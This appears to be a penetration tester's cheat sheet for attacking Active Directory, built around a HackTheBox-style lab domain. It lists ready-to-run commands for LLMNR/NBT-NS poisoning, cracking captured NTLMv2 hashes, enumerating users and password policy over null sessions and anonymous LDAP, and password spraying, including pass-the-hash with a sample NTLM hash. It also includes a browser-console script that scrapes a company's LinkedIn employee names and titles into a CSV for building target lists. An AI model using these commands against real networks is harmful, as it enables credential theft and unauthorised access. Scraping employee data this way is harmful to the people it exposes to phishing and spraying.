# Hash Stealing
### LLMNR/NBT-NS Poisoning from Linux
Several tools can be used to attempt ``LLMNR & NBT-NS`` poisoning :

|**Tool**|**Description**|
|---|---|
|[Responder](https://github.com/lgandx/Responder)|Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.|
|[Inveigh](https://github.com/Kevin-Robertson/Inveigh)|Inveigh is a cross-platform MITM platform that can be used for spoofing and poisoning attacks.|
|[Metasploit](https://www.metasploit.com/)|Metasploit has several built-in scanners and spoofing modules made to deal with poisoning attacks.|

```bash
responder -I ens33
```
### LLMNR/NBT-NS Poisoning from Windows
The tool [Inveigh](https://github.com/Kevin-Robertson/Inveigh) works similar to Responder. Privileges might be needed.
```bash
PS C:\htb> Import-Module .\Inveigh.ps1
PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
### Cracking NTLMv2 Hashes w/ Hashcat
```bash
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
```



# ================================================



# Retrieving Password Policies
## Enumerating Password Policy from Linux
### SMB NULL Sessions
```bash
rpcclient -U "" -N 172.16.5.5

rpcclient $> querydominfo
```

### LDAP Anonymous Bind
```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

### Enum4Linux
```bash
enum4linux-ng -P 172.16.5.5
```


## Enumerating Password Policy from Windows
### SMB NULL Sessions
```bash
C:\htb> net use \\DC01\ipc$ "" /u:""
# Same using a username
C:\htb> net use \\DC01\ipc$ "" /u:guest
```

### From Windows CMD
```bash
C:\htb> net accounts
```

### Using PowerView.ps1
```bash
PS C:\htb> import-module .\PowerView.ps1
PS C:\htb> Get-DomainPolicy
```



# ================================================



# Enumerating Valid Users & Make A List
## LinkedIn Users Scrapping
We can scrap and retrieve the complete list of all working employees from LinkedIn : we'll need to go to the company's people page at `linkedin.com/company/nom-entreprise/people/`, and once in here, we can run from the Firefox's browser console the following script :
```javascript
/**
 * Script d'extraction LinkedIn - Onglet Personnes (Version V2 - Avec clic bouton)
 * Auteur : Gemini (Pour usage éducatif)
 * Environnement : Firefox / Ubuntu
 */

(async function() {
    // --- CONFIGURATION ---
    const CONFIG = {
        scrollDelay: 2500,      // Un peu plus lent pour laisser le temps au DOM de charger après un clic
        maxScrolls: 100,        // Augmenté pour aller plus loin
        filename: 'linkedin_employes_complet.csv'
    };

    // --- SÉLECTEURS ---
    const SELECTORS = {
        card: '.org-people-profile-card__profile-info',
        name: '.artdeco-entity-lockup__title',
        position: '.artdeco-entity-lockup__subtitle',
        // Sélecteur générique pour le bouton de chargement LinkedIn
        loadButton: '.scaffold-finite-scroll__load-button' 
    };

    // --- UTILITAIRES ---
    const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));
    const cleanText = (text) => text ? text.replace(/(\r\n|\n|\r)/gm, " ").trim() : "";

    // Fonction pour trouver un bouton par son texte (Fallback si la classe change)
    function findButtonByText(searchText) {
        const buttons = document.querySelectorAll('button');
        for (const btn of buttons) {
            if (btn.innerText && btn.innerText.includes(searchText)) {
                return btn;
            }
        }
        return null;
    }

    // --- 1. LOGIQUE DE SCROLL ET CLIC ---
    async function smartScroll() {
        console.log("⬇️ Démarrage du Smart Scroll...");
        
        let previousCardCount = 0;
        let scrolls = 0;
        let noChangeCount = 0; // Compteur pour détecter si on est bloqué

        while (scrolls < CONFIG.maxScrolls) {
            // 1. On scrolle tout en bas
            window.scrollTo(0, document.body.scrollHeight);
            await wait(1000); // Petite pause post-scroll

            // 2. Recherche et clic du bouton "Afficher plus"
            // On cherche par classe, sinon par texte (pour la version FR)
            const loadBtn = document.querySelector(SELECTORS.loadButton) || findButtonByText("Afficher plus");
            
            if (loadBtn) {
                console.log("👆 Bouton 'Afficher plus' détecté. Clic !");
                loadBtn.click();
                await wait(CONFIG.scrollDelay); // Pause plus longue après un clic (chargement API)
            } else {
                // Pas de bouton, c'est peut-être juste du scroll infini standard
                await wait(CONFIG.scrollDelay);
            }

            // 3. Vérification de la progression
            const currentCards = document.querySelectorAll(SELECTORS.card).length;
            console.log(`Tour ${scrolls + 1}: ${currentCards} profils affichés.`);

            if (currentCards === previousCardCount) {
                noChangeCount++;
                // Si rien n'a bougé après 3 tentatives (scroll + attente), on considère que c'est fini
                if (noChangeCount >= 3) {
                    console.log("✅ Plus de nouveaux profils chargés après plusieurs tentatives. Fin.");
                    break;
                }
            } else {
                noChangeCount = 0; // Reset si on a trouvé des nouveaux
            }

            previousCardCount = currentCards;
            scrolls++;
        }
        
        console.log("⏹️ Extraction des données...");
        extractAndDownload();
    }

    // --- 2. EXTRACTION ---
    function extractAndDownload() {
        const cards = document.querySelectorAll(SELECTORS.card);
        console.log(`🔍 Total final : ${cards.length} profils récupérés.`);

        if (cards.length === 0) {
            alert("Aucun profil trouvé. Les sélecteurs CSS ont peut-être changé.");
            return;
        }

        let csvContent = "Nom complet;Poste;Lien Profil\n";

        cards.forEach(card => {
            const nameNode = card.querySelector(SELECTORS.name);
            const posNode = card.querySelector(SELECTORS.position);
            
            // Tentative de récupération du lien (souvent dans un <a> parent ou voisin)
            // Le sélecteur dépend de la structure exacte, souvent le nom est dans un lien
            const linkNode = nameNode ? nameNode.closest('a') || nameNode.querySelector('a') : null;

            const name = nameNode ? cleanText(nameNode.innerText) : "Inconnu";
            const position = posNode ? cleanText(posNode.innerText) : "Non renseigné";
            const link = linkNode ? linkNode.href : "";

            const safeName = name.replace(/;/g, ",");
            const safePos = position.replace(/;/g, ",");

            csvContent += `${safeName};${safePos};${link}\n`;
        });

        downloadCSV(csvContent);
    }

    // --- 3. GÉNÉRATION DU FICHIER ---
    function downloadCSV(content) {
        const blob = new Blob([content], { type: 'text/csv;charset=utf-8;' });
        const link = document.createElement("a");
        const url = URL.createObjectURL(blob);
        
        // Ajout de la date dans le nom de fichier
        const date = new Date().toISOString().slice(0,10);
        link.setAttribute("href", url);
        link.setAttribute("download", `linkedin_personnes_${date}.csv`);
        
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    }

    // --- LANCEMENT ---
    const start = confirm("Lancer le script V2 (avec gestion du bouton 'Afficher plus') ?");
    if (start) {
        await smartScroll();
    }

})();
```

## SMB NULL Session
```bash
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

```bash
rpcclient -U "" -N 172.16.5.5

rpcclient $> enumdomusers
```

```bash
crackmapexec smb 172.16.5.5 --users
```

## LDAP Anonymous
```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

```bash
windapsearch -d 10.10.10.161 -m users
```

## Kerbrute
This tool uses [Kerberos Pre-Authentication](https://ldapwiki.com/wiki/Wiki.jsp?page=Kerberos%20Pre-Authentication), which is a much faster and potentially stealthier way to perform password spraying.
```bash
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```



# ================================================



# Password Spraying 
## Password Spraying from Linux
### Bash one-liner
```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

### Kerbrute
```bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```

### NetExec
```bash
netexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
# Validating the found Creds
netexec smb 172.16.5.5 -u Jean.Mahmoud -p Password123 | grep +
```

### Local Admin Password Reuse
We could try to spray password on other non-domain joined hosts, not only domain user. The `--local-auth` flag will tell the tool only to attempt to log in one time on each machine, which removes any risk of account lockout.
```bash
netexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```



## Password Spraying from Windows
### Using DomainPasswordSpray.ps1
```bash
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

